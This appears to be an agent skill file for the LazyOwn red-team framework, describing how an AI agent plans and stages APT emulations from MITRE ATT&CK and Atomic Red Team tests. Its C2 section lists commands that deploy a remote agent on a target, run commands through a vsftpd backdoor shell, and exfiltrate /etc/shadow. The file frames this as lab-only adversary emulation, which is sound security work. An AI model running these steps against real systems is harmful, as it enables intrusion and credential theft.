---
name: apt-emulation
description: "Emulate APT adversaries end-to-end in LazyOwn: research MITRE ATT&CK techniques, translate them to Atomic Red Team tests, build ordered emulation plans, and stage executable artefacts. Knows the resolver, the TTPScope bridge with its offline fallbacks, the MCP tools, and the CLI flow."
trigger: /apt-emulation
---

# /apt-emulation

Emulate a real adversary by chaining MITRE ATT&CK techniques into concrete,
executable Atomic Red Team tests. Research is read-only; staging writes files
under `sessions/`; nothing runs on a target without an explicit operator step.

## Usage

```
/apt-emulation T1003 T1059.001 --platform windows
/apt-emulation apt29 --platform linux
```

A bare technique list means "build the emulation plan". The name of a
playbook in `playbooks/apt_*.yaml` means "emulate that APT". For the
whole thing as one command (scan unless cached, sweep, validate, plan,
stage), run the chain instead of the steps below:

```
apt_chain apt_rocke 172.17.0.2
```

Chains are fully YAML-administered: `chains/apt_chain.yaml` holds the
steps; per-APT files (`chains/apt_rocke.yaml`, ...) inherit it through
`extends:` and only pin the playbook default. Manage them from the
`lazy_orchestrator` Chains tab (preview steps, enable/disable,
generate from playbook, delete) or by editing the files — the
`apt_chain` command only interprets. The autonomous loop reaches the
same chains through its `apt_chain` verb (`auto apt_chain rocke
<target>` proposes from emulation goals, binds, and routes through the
shell executor).

## The pipeline (in order, skip nothing)

```
1. RESEARCH  ttpscope show/chain  -> what the technique is and how it relates
2. RESOLVE   atomic_resolver      -> technique ID to test GUIDs
3. PLAN      ttp_chain            -> ordered steps, one test per technique
4. STAGE     atomic_gen           -> scripts under sessions/temp_uploads/
5. EMULATE   atomic_emulate       -> executed via live shell, report staged
6. SHELL     atomic_shell         -> interactive root REPL (foreground only)
7. CLEAN     atomic_clean         -> artefacts wiped, loot/reports kept
```

Research and planning never touch a target. Steps 1-4 are always safe to run.
Step 5 executes on the target through the multiplexed session (lab and
in-scope targets only). Step 6 opens an interactive REPL exclusively in a
foreground terminal — loop workers always get verify-only mode instead.
Step 7 soft-cleans by default; `--hard` destroys the gym container.

MCP equivalents: `lazyown_ttp_chain` (plan), `lazyown_apt_chain`
(full chain), `lazyown_atomic_shell` (verify-only check),
`lazyown_atomic_clean` (soft; hard needs confirm=true).

## Step 1 — Research the technique

Prefer the MCP tool when available, CLI otherwise. Both answer even when the
TTPScope C binary is missing (result carries `backend: fallback-*`).

```python
# MCP: full briefing (TTPScope context + Atomic tests + parquet hits)
lazyown_ttp_chain(techniques=["T1003", "T1059.001"], platform="windows")
```

```bash
# CLI equivalents (inside the LazyOwn shell)
ttpscope action=show technique_id=T1003
ttpscope action=chain technique_id=T1059.001 platform=windows
```

First run on a fresh checkout needs `ttpscope action=sync` once to cache the
STIX bundle at `~/.cache/ttpscope/enterprise-attack.json`. Without it, `show`
covers techniques (`T*`) from `parquets/` but not groups (`G*`), software
(`S*`), or mitigations (`M*`); those return an `attack.mitre.org` link.

Never run `ttpscope action=tui` from an agent. It needs an interactive TTY.

## Step 2 — Resolve MITRE IDs to Atomic tests

One MITRE technique maps to N Atomic tests. The GUIDs (UUIDs) identify single
tests; the `T####` codes identify techniques. Translation lives in
`modules/atomic_resolver.py` — the single source of truth. Nothing else in
the repo should parse Atomic YAML directly.

```python
# MCP translator (offline-first: vendored repo, then parquet fallback)
lazyown_atomic_resolve(query="T1059.001", platform="windows", include_command=True)
lazyown_atomic_resolve(query="T1059")          # prefix: all sub-techniques
lazyown_atomic_resolve(query="<guid>")         # reverse: GUID to technique
```

```bash
# CLI (non-interactive form for agents and loops)
atomic_tests T1059.001 --platform windows --non-interactive
```

```python
# Python (playbooks, daemon, custom tooling)
from modules.atomic_resolver import get_resolver
resolver = get_resolver()
tests = resolver.list_for_technique("T1059.001", platform="windows")
plan = resolver.chain(["T1003", "T1059.001"], platform="windows")  # skips unknown IDs
```

Rules: validate every ID before use (`is_mitre_id` / `is_guid`); an unknown
technique resolves to an empty list, never an exception inside `chain`; a bare
parent such as `T1059` expands to its sub-techniques.

## Step 3 — Plan the chain

`lazyown_ttp_chain` takes an ordered technique list and returns one
platform-compatible test per technique plus a staged JSON plan at
`sessions/ttp_chain_<platform>_<ts>.json`. For named APTs, use the playbook
flow instead:

```bash
apt_playbook list
apt_playbook info apt29
apt_playbook run apt29        # writes the attack plan
attack_plan playbooks/<file>  # generates per-step artefacts
```

`attack_plan <file> --auto` executes immediately. Treat `--auto` like a
loaded weapon: only with operator approval.

## Step 4 — Stage artefacts

```bash
atomic_gen <guid> --non-interactive
atomic_gen T1059.001 --platform windows --non-interactive
```

Output lands in `sessions/temp_uploads/` as `atomic_test_<id>.sh|.ps1` plus a
cleanup twin, mode `0600`, variables (`#{ip_address}`, `#{username}`, ...)
pre-filled from live shell params with declared test defaults as fallback.
Staging copies commands to the clipboard when available; clipboard failure
never aborts.

## Step 5/6 — Emulate and clean

Hand the staged scripts to the operator with, per step: technique ID, MITRE
URL, test name, prereq commands, main command, cleanup command. After
execution, run the cleanup twin and confirm the artefact state.

## Live C2 sessions (execution that the loop can drive)

Staged scripts need a live target to run on. For lab targets with a root
shell primitive, the loop deploys a malleable agent and operates it
entirely through shell commands — no interactive prompts anywhere:

```
c2_server start                  # headless lazyc2 (idempotent) + lab HTTP listener
c2_deploy 172.17.0.2             # drop + launch agent via working shell primitive
c2_exec msf-172-17-0-2 id        # issue command, wait, print answer from records log
c2_loot 172.17.0.2 /etc/shadow   # exfiltrate to sessions/loot/ + manifest.jsonl
c2_server stop
```

Every step feeds the dashboard through `modules/c2_surfaces.py`
(banners, CVEs, notes, loot event rules) — the same surfaces the
operator sees at `/banners`, `/cves`, `/notes`, `/tasks`:

- exploit sweep matches publish service banners; shells and CVEs land
  on every attempt via `record_outcome`;
- loot appends a timestamped note and registers an event rule;
- the chain ends with `create_session_json` so `/report` renders fresh;
- `/tasks` groups identical titles (×N badge) and tallies filtered
  noise; the daemon no longer creates timestamp/URL bogus credential
  tasks nor duplicate open titles at the source.

Mechanics to remember next session:

- Client ids are `msf-<target-with-dashes>` (`client_id_for`). The C2
  queue file `sessions/cmd_<id>.json` persists across server restarts —
  `deploy` truncates it so stale commands never replay.
- Answers land in `sessions/<client_id>.records.jsonl` (one JSON per
  line: `command`, `output`, `user`, `hostname`). `wait_record` polls it.
- The AES key is owned by the server (`sessions/key.aes` while running)
  and snapshotted to `sessions/c2_lab.json` on boot. Tooling NEVER
  generates keys: a rotated key bricks deployed agents (garbage commands
  in, HTTP 500 out). After any C2 restart, redeploy agents.
- The gym runs Python 2.5 with no `ssl` module: the agent speaks plain
  HTTP (lab listener, e.g. :8080) and does AES via the `openssl` CLI.
  Never use `timeout=` kwargs or `except...as` in agent code.
  `os.closerange` does not exist on 2.5 either — close fds one by one.
- Deployed agents MUST drop inherited fds at startup (close 3..255,
  stdin from /dev/null). An agent born in a backdoor shell otherwise
  inherits its LISTEN socket and wedges the target port permanently —
  every later trigger fails and only killing the agent (or restarting
  the target) recovers it.
- Single-shot backdoors (vsftpd :21/:6200) serve effectively one shell
  per trigger: one trigger, one persistent multiplexed session, clean
  `exit` on close. Never stack connections; never abandon sessions.
- Beacon poll/result routes are limiter-exempt (AES already
  authenticates); the global 200/hour limit would otherwise 429 agents
  polling every 10s — and the generic error handler masks 429s as 500s,
  which once cost a full debugging session. Poll at 25s+ regardless.
- `issue_command_to_c2` / `download_file_from_c2` fail loudly instead
  of prompting when stdin is not a TTY — always pass explicit client ids.
- Lab C2 creds live in `sessions/c2_lab.json`, never in `payload.json`.
  The human-visible `.c2_credentials.txt` always holds the RUNNING
  server's creds: `c2_server start` rewrites it on every boot, and the
  shell adopts it at startup (`_sync_c2_credentials`, which must run
  AFTER `self.params` exists — a past ordering bug made it dead code
  that swallowed its own AttributeError). If login fails, compare the
  file against `c2_server status` (`live_user`): different values mean
  the server was started outside the manager with other creds.
- `payload.json` required keys must never go null: `assign` refuses
  null/blank on validation errors, MCP `set_config` refuses blanks,
  and shell-less `auto_populate` refuses to save (it once truncated
  the file to 2 keys). If `[payload] ERROR ... required but missing`
  appears at boot, restore via `assign` and check
  `sessions/config_changes.jsonl` to identify the writer. `assign`
  redacts schema-sensitive values instead of echoing secrets.
- Tests must NEVER write the real `payload.json`: patch
  `core.config.save_payload` (where function-level imports look it
  up), never the caller's namespace, and hash-check the file
  before/after when in doubt. A wrongly-placed monkeypatch once
  truncated the operator's payload to 4 keys mid-session.
- The full chain already includes these steps (`chains/apt_chain.yaml`):
  `apt_chain rocke 172.17.0.2` runs assign → scan → sweep → c2_server →
  c2_deploy → c2_loot shadow → validate → plan → stage → emulate.

## Enrichment sources (read-only, always available)

| Source | MCP tool | Contents |
|--------|----------|----------|
| Atomic catalogue (1690 tests) | `lazyown_atomic_search` | keyword + `mitre_id` + platform + scope + complexity + prereq filters |
| MITRE techniques | `lazyown_parquet_query` | `mode="keyword"` / `"context"` over `parquets/techniques*.parquet` |
| Session history | `lazyown_parquet_query` | `mode="session"` — what already worked against this target |
| Phase briefing | `lazyown_parquet_query` | `mode="context"` — history + GTFOBins + MITRE for one phase |

Check `sessions/scan_<rhost>.nmap*` and the world model before planning. Never
re-scan what is already known. Never invent technique IDs: if `resolve`
returns empty, say so and suggest the closest prefix via `lazyown_atomic_search`.

## Module map

| File | Role |
|------|------|
| `modules/atomic_resolver.py` | MITRE <-> GUID translator + `chain()`. No shell, no network. |
| `modules/atomic_cli.py` | Secure `atomic_tests` / `atomic_gen` implementation. Non-interactive safe. |
| `modules/ttpscope_bridge.py` | TTPScope wrapper with STIX/parquet/Markdown fallbacks. No hard binary dependency. |
| `modules/playbook_engine.py` | Phase-aware playbook derive/run loop (STIX tactics -> Atomic tests). |
| `lazyaddons/ttpscope.yaml` | Research client as a first-class LazyOwn command. |
| `cli/commands/command_and_control_migrated.py` | Thin `do_atomic_tests` / `do_atomic_gen` wrappers. No logic here. |

## Known upstream gaps (not stale clones)

Some techniques have zero Atomic tests even upstream — verified against
`redcanaryco/atomic-red-team` HEAD, not a stale checkout. `resolve`
returns empty and `validate` reports them honestly; do not retry in a
loop expecting different results:

- `T1190` (Exploit Public-Facing Application) — no generic atomic test exists.
- `T1210` (Exploitation of Remote Services) — no generic atomic test exists.

Cover these vectors with the YAML exploit catalogue instead
(`exploits/*.yaml` + `/atomic-exploit`): the `atomic_exploit` sweep and
the engine's ranked candidates execute them for real, and the world
model scores them alongside atomic-backed techniques.

## Self-check before handing off a plan

1. Every technique resolved to a GUID, or explicitly marked unresolvable.
2. Platform filter applied to every step (no Windows-only test in a Linux plan).
3. Plan JSON staged under `sessions/` and its path reported.
4. Cleanup twin exists for every staged test script.
5. No step executes without operator confirmation.
